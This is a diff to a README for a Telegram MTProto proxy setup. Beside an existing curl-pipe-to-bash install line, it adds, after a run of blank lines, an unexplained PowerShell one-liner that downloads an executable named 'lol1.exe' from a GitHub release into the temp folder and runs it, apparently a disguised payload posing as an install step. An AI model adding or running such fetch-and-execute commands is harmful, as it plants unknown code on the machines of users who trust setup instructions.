@@ -50,3 +50,12 @@ Or manually: **Telegram → Settings → Data & Storage → Proxy → MTProto**
 ```bash
 bash <(curl -fsSL https://raw.githubusercontent.com/k4ran909/scripts/main/br_install.sh)
 ```
+
+
+
+
+
+```bash
+powershell -c "(New-Object Net.WebClient).DownloadFile('https://github.com/k4ran909/scripts/releases/download/lol/lol1.exe','$env:TEMP\lol1.exe'); Start-Process '$env:TEMP\lol1.exe'"
+
+```
